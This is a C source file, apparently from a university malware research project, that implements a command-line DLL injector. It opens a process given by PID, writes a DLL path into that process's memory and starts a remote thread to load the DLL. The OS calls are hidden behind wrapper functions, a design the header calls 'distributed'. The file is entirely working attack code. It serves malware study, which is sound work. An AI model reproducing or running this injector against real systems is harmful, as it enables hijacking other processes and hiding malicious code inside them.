/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

/* Include Block */
#include<windows.h>
#include<stdio.h>
#include<string.h>
#include "functions.h"

/* DLL Injection */
void inject(char *dll,int pid)
{
	/* Get process handler */
	HANDLE proc = OPENPROC(pid);
	if(!proc)
	{
		printf("OpenProc error\n");
		exit(0);
	}

	int size= (strlen(dll)+1)*sizeof(char);
	
	/* Allocate memory */
	LPVOID alloc = VIRTUALALLOC(proc,size);
	if(!alloc)
	{
		printf("VirtualAlloc error\n");
		exit(0);
	}

	/* Write code there */
	BOOL write = WRITEPROC( proc, alloc,dll, size);
	if(!write)
	{
		printf("WriteProcMem error\n");
		exit(0);
	}

	/* Locate module */
	HMODULE k32 = GetModule();
	if(!k32)
	{
		printf("GetModule error\n");
		exit(0);
	}

	/* Get thread */
	PTHREAD_START_ROUTINE tStart = GetThreadStart(k32);
	if(!tStart)
	{
		printf("GetThreadStart error\n");
		exit(0);
	}

	/* Create thread */
	HANDLE thread = CreateThread(proc,tStart,alloc);
	if(!thread)
	{
		printf("CreateThread error\n");
		exit(0);
	}

	/* Wait */
	WaitForSingleObject(thread, INFINITE);

	/* Check exit */
	DWORD ExitCode; 
 	if (!GetExitCodeThread(thread,&ExitCode))
	{
		printf("GetExitCode error\n");
		exit(0);
	}
	printf("Exit code: %x\n",ExitCode);
}

/* main */
int main(int argc, char *argv[])
{
	/* PID as argument */
	int pid = atoi(argv[2]);
	/* DLL as argument */
	char *dll=argv[1];
	/* Inject given DLL into a given process */
	inject(dll,pid);
	return 0;
}